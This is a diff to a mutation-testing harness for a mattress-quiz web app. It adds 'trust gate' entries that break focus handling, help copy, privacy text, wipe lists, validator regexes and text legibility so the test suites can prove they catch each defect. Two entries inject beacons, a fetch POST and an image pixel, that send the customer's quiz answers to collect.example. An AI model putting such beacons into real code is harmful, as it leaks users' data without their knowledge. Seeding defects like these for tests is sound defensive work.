@@ -100,6 +100,16 @@ const PAY_RENDER = ["tests/financing_render_check.mjs"];
 // config-admission side of Payment Choice: which financing blocks are allowed
 // to exist, as distinct from what index.html does with one that does.
 const PAY_VALIDATOR = ["tools/validation.py --self-test"];
+// Trust integrity gate observer (2026-08-21): the trust suite owns the copy <->
+// engine correspondence (document sections, cited tags, the inert-tag set,
+// shipped-vs-documented help lines, banned claims), the absence of the
+// heritage rail, the privacy voice and its network-sink pin, and the
+// tier-relativity legibility. Entries that mutate a generated or documentary
+// target name it with the fifth field.
+const TRUST = ["tests/trust_integrity_check.mjs"];
+// The contrast suite joins the trust suite as observer for the legibility of
+// the three integrity lines (size floors and normal-text contrast).
+const TRUST_CONTRAST = TRUST.concat(["tests/contrast_check.mjs"]);
 // Slice 5 (Sleep Plan). Every entry below names its observer explicitly.
 const PLAN = ["tests/sleep_plan_check.mjs"];
 const PLAN_WITH_SESSION = PLAN.concat(["tests/session_safety_check.mjs"]);
@@ -943,11 +953,11 @@ const MUTATIONS = [
     "    }\n\n    .noct-slider-track::-webkit-slider-thumb {", QUIZ],
 
   // Focus wiring: both halves of the shared contract.
-  ["quiz: the five Quiz/Review controls are dropped from the focus rule",
-    "    .noct-profile-secondary:focus-visible,\n    .noct-quiz-option:focus-visible,\n    .noct-quiz-back:focus-visible,\n    .noct-quiz-next:focus-visible,\n    .noct-review-edit:focus-visible,\n    .noct-slider-track:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);",
+  ["quiz: the five Quiz/Review controls (and the trust-gate headline) are dropped from the focus rule",
+    "    .noct-profile-secondary:focus-visible,\n    .noct-quiz-headline:focus-visible,\n    .noct-quiz-option:focus-visible,\n    .noct-quiz-back:focus-visible,\n    .noct-quiz-next:focus-visible,\n    .noct-review-edit:focus-visible,\n    .noct-slider-track:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);",
     "    .noct-profile-secondary:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);", QUIZ],
-  ["quiz: the five controls are dropped from the forced-colors focus fallback",
-    "      .noct-profile-secondary:focus-visible,\n      .noct-quiz-option:focus-visible,\n      .noct-quiz-back:focus-visible,\n      .noct-quiz-next:focus-visible,\n      .noct-review-edit:focus-visible,\n      .noct-slider-track:focus-visible {\n        outline-color: CanvasText;",
+  ["quiz: the five controls (and the trust-gate headline) are dropped from the forced-colors focus fallback",
+    "      .noct-profile-secondary:focus-visible,\n      .noct-quiz-headline:focus-visible,\n      .noct-quiz-option:focus-visible,\n      .noct-quiz-back:focus-visible,\n      .noct-quiz-next:focus-visible,\n      .noct-review-edit:focus-visible,\n      .noct-slider-track:focus-visible {\n        outline-color: CanvasText;",
     "      .noct-profile-secondary:focus-visible {\n        outline-color: CanvasText;", QUIZ],
 
   // Every required 44px interaction floor, one entry each.
@@ -994,6 +1004,193 @@ const MUTATIONS = [
   ["quiz: switchLanguage stops recording the focus hint by id (option ids no longer feed the restore path)",
     "      if (active && active.id) _langFocusHintId = active.id;",
     "      if (false) _langFocusHintId = active.id;", QUIZ],
+
+  // ---- Trust integrity gate (2026-08-21): question-change scroll/focus ------
+  // Observed by the quiz suite's REPAIR 9 section. The defect these guard
+  // against was measured on the mounted orientation: after Next on a tall
+  // question the next headline rendered above the viewport and focus fell to
+  // BODY.
+  ["trust: a question change no longer resets the scroll position",
+    "      if (typeof window.scrollTo === 'function') window.scrollTo(0, 0);\n      screen.scrollTop = 0;",
+    "      screen.scrollTop = 0;", QUIZ],
+  ["trust: a question change no longer focuses the new headline",
+    "      var heading = document.getElementById('questionHeadline');",
+    "      var heading = null;", QUIZ],
+  ["trust: every render is treated as a question change (answer taps and language switches would steal focus)",
+    "      var questionChanged = _renderedQuestionId !== null && _renderedQuestionId !== q.id;",
+    "      var questionChanged = true;", QUIZ],
+  ["trust: showScreen stops handing the first render to the screen transition (double-handled entry)",
+    "      if (!sameScreen && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();",
+    "", QUIZ],
+  ["trust: the question headline becomes a permanent tab stop",
+    'id="questionHeadline" tabindex="-1"', 'id="questionHeadline" tabindex="0"', QUIZ],
+  ["trust: the question-change repair ignores the shared refusal gate",
+    "      if (typeof screenTransitionOwnedElsewhere === 'function' && screenTransitionOwnedElsewhere()) return;\n      var screen = document.getElementById('questionScreen');",
+    "      var screen = document.getElementById('questionScreen');", QUIZ],
+  ["trust: showScreen hands the first render to the screen only on Review transitions (a new customer's first question is double-handled)",
+    "      if (!sameScreen && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();",
+    "      if (!sameScreen && id === 'reviewScreen' && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();", QUIZ],
+  ["trust: the rendered-question record freezes at the first question (every later answer tap becomes a change)",
+    "      _renderedQuestionId = q.id;", "      if (_renderedQuestionId === null) _renderedQuestionId = q.id;", QUIZ],
+  ["trust: the question-change repair stops checking that the question screen is the active screen",
+    "      if (!screen || !screen.classList || !screen.classList.contains('active')) return;", "", QUIZ],
+  ["trust: the question-change repair stops honouring isFocusRestorable()",
+    "      if (typeof isFocusRestorable === 'function' && !isFocusRestorable(heading)) return;", "", QUIZ],
+
+  // ---- Trust integrity gate (2026-08-21): copy <-> engine correspondence --
+  ["trust: a shipped overclaim returns to a help line (\"easy fix\")",
+    '"en": "If you sleep hot, we favor cooling features in your matches."',
+    '"en": "Sleeping hot or cold is an easy fix with the right materials."', TRUST, "data/quiz.json"],
+  ["trust: a help line drifts from the line the correspondence document records",
+    '"en": "This helps us favor pressure relief, support, or a responsive feel."',
+    '"en": "This helps us favor pressure relief, support, or a responsive feel, and more."', TRUST, "data/quiz.json"],
+  ["trust: a question loses its correspondence section",
+    "### 2. mattress_size", "### 2. mattress_sizes", TRUST, "docs/quiz-copy-engine-correspondence.md"],
+  ["trust: the documented inert-tag set drifts from the shipped catalog",
+    "`Inert tags: adjustable, comfort,", "`Inert tags: comfort,", TRUST, "docs/quiz-copy-engine-correspondence.md"],
+  ["trust: the document cites a mechanism the question does not score",
+    "- **Cited tags:** cooling, hybrid, memory, plush.", "- **Cited tags:** cooling, hybrid, memory, plush, motionIsolation.",
+    TRUST, "docs/quiz-copy-engine-correspondence.md"],
+  ["trust: the quiz root contract is widened for retailer prose",
+    '{\n  "questions": [', '{\n  "trustStories": [],\n  "questions": [', TRUST, "data/quiz.json"],
+
+  // ---- Trust integrity gate (2026-08-21): privacy voice ---------------------
+  // ---- Trust gate, owner ruling R5 (2026-08-21): the idle dialog body --------
+  // Observed by the session suite, which opens the dialog through the real
+  // controller on a fake clock and pins the RENDERED body in both languages.
+  ["trust: the idle dialog body reverts to the privacy reassurance (EN)",
+    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",',
+    '"safety.timeout_body": "Your session is paused to protect your privacy.",', WITH_SESSION, "data/dict-en.json"],
+  ["trust: the idle dialog body stops naming the real controls (EN)",
+    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",',
+    '"safety.timeout_body": "Session paused. Continue where you left off, or restart to clear this session.",', WITH_SESSION, "data/dict-en.json"],
+  ["trust: the Spanish idle dialog body silently becomes English",
+    '"safety.timeout_body": "Sesión en pausa. Sigue en esta sesión donde la dejaste o empieza con otro cliente para borrarla.",',
+    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",', WITH_SESSION, "data/dict-es.json"],
+  ["trust: the idle dialog body becomes a hardcoded literal in index.html",
+    "      setSafetyText('sessionSafetyBody', t(cfg.bodyKey));",
+    "      setSafetyText('sessionSafetyBody', _safetyMode === 'timeout' ? 'Session paused. Continue this session where you left off, or start a new customer to clear it.' : t(cfg.bodyKey));", WITH_SESSION],
+  // Anchored on the four ids alone (not on their position in the array), so the
+  // entry still applies after Slice 5 appends its own ids to the inventory.
+  ["trust: the Sleep System containers leave the wipe inventory (a previous customer's prose survives Restart)",
+    "'sleepSystemMain', 'sleepSystemGuidance', 'sleepSystemRail', 'sleepSystemPlanList'",
+    "", TRUST.concat(["tests/session_safety_check.mjs"])],
+  ["trust: the drawer's answer-derived text leaves the wipe inventory",
+    "'drawerShortlistFit', 'drawerSystemPromptTitle', 'drawerSystemPromptReason',", "", TRUST.concat(["tests/session_safety_check.mjs"])],
+  ["trust: the Welcome renderer stops calling the data-use renderer (the line never renders)",
+    "      renderDataUseStatement();", "      if (false) renderDataUseStatement();", TRUST],
+  ["trust: the welcome data-use line ignores deployment mode (always the preview sentence)",
+    "      var key = emailDeliveryLive() ? 'privacy.data_use_live' : 'privacy.data_use_preview';",
+    "      var key = 'privacy.data_use_preview';", TRUST],
+  ["trust: a missing data-use variant renders the dictionary KEY instead of nothing",
+    "      if (typeof text === 'string' && text.trim() && text !== key) {",
+    "      if (typeof text === 'string') {", TRUST],
+  ["trust: the shared mode helper ignores a scenario that disables submission",
+    "      return !!gasUrl && !scenarioBlocksEmail;", "      return !!gasUrl;", TRUST],
+  ["trust: the email screen's preview note stops deriving from the shared mode helper",
+    "      var isDemoMode = !emailDeliveryLive();", "      var isDemoMode = false;", TRUST],
+  ["trust: the retired template promise returns to the email screen",
+    "      setText('emailPrivacyLead', localizedConfigBlock('text').emailPrivacy || '');",
+    "      setText('emailPrivacyLead', (localizedConfigBlock('text').emailPrivacy || '') + ' Your info is never sold to third parties. Unsubscribe anytime.');",
+    TRUST],
+  ["trust: the privacy-overlay fallback promise returns to the template",
+    '<span data-store="privacy-body"></span>',
+    '<span data-store="privacy-body">Your information is never sold or shared with third parties.</span>', TRUST],
+  ["trust: the Review line reverts to the inline claim that the specialist builds the matches",
+    "      if (help) help.textContent = t('review.help');",
+    "      if (help) help.textContent = 'A quick check, then your specialist builds your recommendations.';", TRUST],
+  ["trust: a third network sink appears (a beacon carrying the answers)",
+    "        answers[qId] = optId;\n      }\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
+  ["trust: a pixel beacon carries the answers to an external host",
+    "        answers[qId] = optId;\n      }\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
+  ["trust: the Spanish data-use variant silently becomes English",
+    '"privacy.data_use_preview": "Durante esta sesión en la tienda,',
+    '"privacy.data_use_preview": "During this showroom session,', TRUST, "data/dict-es.json"],
+  ["trust: the validator stops rejecting preview-mode privacy prose under a live gasUrl",
+    "    if live_at_runtime:\n        _check_privacy_prose_mode(r, config)",
+    "    if False:\n        _check_privacy_prose_mode(r, config)", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the validator accepts a non-blank placeholder gasUrl again (live at runtime, pointing at a sentinel)",
+    "    if live_at_runtime and is_placeholder:",
+    "    if False:", PAY_VALIDATOR, "tools/validation.py"],
+  // External review threads (2026-08-22): thread 1 preserved as intentional,
+  // thread 2 fixed — each pinned by the validator self-test.
+  ["trust: the validator follows a temporary scenario's momentary email block (live-capable admission relaxed)",
+    "    live_at_runtime = _runtime_truthy(raw_gas)",
+    "    live_at_runtime = _runtime_truthy(raw_gas) and not ((config.get('promotions') or {}).get('activeScenario'))",
+    PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: admission keys on the STRIPPED gasUrl again (a whitespace-only gasUrl is live at runtime but admitted as blank)",
+    "    live_at_runtime = _runtime_truthy(raw_gas)",
+    "    live_at_runtime = not _blank(gas)", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: storage-negation phrases fire without governed-data context (truthful unrelated sentence rejected)",
+    "            if _storage_claim_is_governed(sentence, prev_sentence, kind, start, end):",
+    "            if True:", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the contracted storage negations drop out of the family ('your answers aren't stored' admitted)",
+    "_NEG = r\"(?:n't|\\bnot\\b|\\bnever\\b|\\bcannot\\b|\\bno longer\\b)\"",
+    "_NEG = r\"(?:\\bnot\\b|\\bnever\\b|\\bcannot\\b|\\bno longer\\b)\"", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: typographic apostrophes stop folding to ASCII ('weren\u2019t stored' admitted)",
+    "_PROSE_FOLD = str.maketrans({\"\\u2019\": \"'\", \"\\u2018\": \"'\",",
+    "_PROSE_FOLD = str.maketrans({\"\\u2018\": \"'\",", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the adverb gap between negation and verb closes ('not permanently stored' admitted)",
+    "_GAP = r\"\\s+(?:\" + _GAP_TOKEN + r\"\\s+){0,3}?\"",
+    "_GAP = r\"\\s+\"", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the gap accepts any word again ('we do not ask lenders to store your answers' rejected)",
+    "_GAP = r\"\\s+(?:\" + _GAP_TOKEN + r\"\\s+){0,3}?\"",
+    "_GAP = r\"\\s+(?:[a-z'-]+\\s+){0,3}?\"", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: only the first destination word is checked for universality ('to absolutely anyone' admitted)",
+    "    return (any(w.startswith(_UNIVERSAL_DESTINATIONS) for w in text.split())",
+    "    return (text.split()[0].startswith(_UNIVERSAL_DESTINATIONS) if text.split() else False)", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the universal scan stops at the clause ('with our providers or anyone else' after a comma list admitted)",
+    "    destination_text = _destination_continuation(clause_after, rest_after)",
+    "    destination_text = clause_after", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the universal scan runs over the whole sentence tail again ('..., but anyone can ask us questions' rejected)",
+    "    destination_text = _destination_continuation(clause_after, rest_after)",
+    "    destination_text = rest_after", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: a coordinated destination segment is capped by length again (a long list ending in 'or anyone else' admitted)",
+    "        elif not (any(t in _COORDINATORS for t in tokens) or len(tokens) <= _LIST_ITEM_MAX_WORDS):",
+    "        elif len(tokens) > 6:", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: a leading ', and' no longer needs a short item after it (a coordinated clause 'and anyone who asks ...' rejected)",
+    "            if len(tokens) - 1 > _LIST_ITEM_MAX_WORDS:\n                break",
+    "            if False:\n                break", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: a colon/parenthesis/dash no longer ends the destination (a following fragment is scanned as a destination)",
+    "            if not (sep in (\"—\", \"–\") and tokens and tokens[0] in _COORDINATORS):\n                break",
+    "            if False:\n                break", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the bare determiner 'any' counts as universal again ('to any lender' rejected)",
+    "_UNIVERSAL_DESTINATIONS = (\"anyone\", \"anybody\", \"anything\", \"anywhere\", \"elsewhere\", \"outside\",",
+    "_UNIVERSAL_DESTINATIONS = (\"any\", \"anyone\", \"anybody\", \"anything\", \"anywhere\", \"elsewhere\", \"outside\",", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: transmission negations stop being judged for absoluteness (an absolute 'not transmitted' about answers admitted)",
+    "    if kind in _TRANSMIT_KINDS and not _transmission_is_absolute(clause_after, sentence[end_pos:]):\n        return False",
+    "    if kind in _TRANSMIT_KINDS:\n        return False", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: a qualified destination no longer exempts a transmission negation ('not transmitted to lenders' rejected again)",
+    "    m = _DESTINATION_RE.search(clause_after)\n    if not m:\n        return True",
+    "    m = None\n    if not m:\n        return True", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: only the first occurrence of a storage phrase is inspected (a later governed clause is admitted)",
+    "        for kind, start, end, display in _storage_matches(sentence):",
+    "        for kind, start, end, display in _storage_matches(sentence)[:1]:", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: clause conjunctions stop delimiting the bound phrase ('X are emailed but card details are not stored' rejected)",
+    "    starts += [i + len(c) for i, c in ((sentence.rfind(c, 0, pos), c) for c in _CLAUSE_CONJUNCTIONS) if i >= 0]",
+    "    starts += []", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the storage-negation family is switched off (answer-storage promises admitted under a live gasUrl)",
+    "    for idx, sentence in enumerate(sentences):",
+    "    for idx, sentence in []:", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the storage negation binds to the whole sentence again (a time adverbial like 'your session' rejects an unrelated claim)",
+    "    for fragment in order:\n        if _has_content(fragment):\n            return _governed_in(fragment)\n    return False",
+    "    return _governed_in(sentence)", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the storage negation stops widening to the previous sentence (a pronoun subject after an email sentence is admitted)",
+    "        order = (clause_before, sentence[:pos], clause_after, prev_sentence)",
+    "        order = (clause_before, sentence[:pos], clause_after)", PAY_VALIDATOR, "tools/validation.py"],
+
+  // ---- Trust integrity gate (2026-08-21): legibility of the honest lines ---
+  ["trust: the tier-relativity note shrinks back below body size",
+    "      margin-top: 8px;\n      font-size: 15px;\n      line-height: 1.45;",
+    "      margin-top: 8px;\n      font-size: 11px;\n      line-height: 1.45;", TRUST_CONTRAST],
+  ["trust: the welcome data-use sentence shrinks below body size",
+    "    .landing-data-use {\n      font-family: var(--font-sans);\n      font-size: 16px;",
+    "    .landing-data-use {\n      font-family: var(--font-sans);\n      font-size: 12px;", TRUST_CONTRAST],
+  ["trust: the tier-relativity note drops to a low-contrast ink",
+    "      font-size: 15px;\n      line-height: 1.45;\n      color: var(--color-text-muted);",
+    "      font-size: 15px;\n      line-height: 1.45;\n      color: var(--color-text-subtle);", TRUST_CONTRAST],
 
   // ---- Slice 4 / D4: the Payment Choice state model ------------------------
   // The two dimensions, and the line between them. Exploration is descriptive
@@ -1396,7 +1593,9 @@ process.on("exit", () => { try { rmSync(sandbox, { recursive: true, force: true 
 for (const d of ["tests", "data", "docs", "tools", "incoming", "demo"]) {
   cpSync(join(root, d), join(sandbox, d), { recursive: true });
 }
-for (const f of ["index.html", "Code.gs"]) cpSync(join(root, f), join(sandbox, f));
+// CLAUDE.md joins the copy set because the trust suite pins that it carries no
+// paragraph legitimizing retailer prose in the quiz contract.
+for (const f of ["index.html", "Code.gs", "CLAUDE.md"]) cpSync(join(root, f), join(sandbox, f));
 
 // Per-target pristine sources. Entries name their target with a fifth field;
 // index.html is the default. Every mutated target is restored before the next
@@ -1406,6 +1605,7 @@ const PRISTINE_BY_FILE = {
   "index.html": PRISTINE,
   "Code.gs": readFileSync(join(sandbox, "Code.gs"), "utf8"),
   "data/dict-es.json": readFileSync(join(sandbox, "data", "dict-es.json"), "utf8"),
+  "data/dict-en.json": readFileSync(join(sandbox, "data", "dict-en.json"), "utf8"),
   // The financing copy propagation chain: authored source, generated
   // production config, generated demo bundle. Mutating each in turn proves the
   // chain is actually compared rather than assumed.
@@ -1421,6 +1621,12 @@ const PRISTINE_BY_FILE = {
   // `experience` bypass shipped green.
   "tools/validation.py":
     readFileSync(join(sandbox, "tools", "validation.py"), "utf8"),
+  // Trust gate: the generated quiz copy and the correspondence document that
+  // governs it. Mutating each proves the suite compares them rather than
+  // trusting either.
+  "data/quiz.json": readFileSync(join(sandbox, "data", "quiz.json"), "utf8"),
+  "docs/quiz-copy-engine-correspondence.md":
+    readFileSync(join(sandbox, "docs", "quiz-copy-engine-correspondence.md"), "utf8"),
 };
 
 // Observers are node suites by default. The validator's self-test is the one
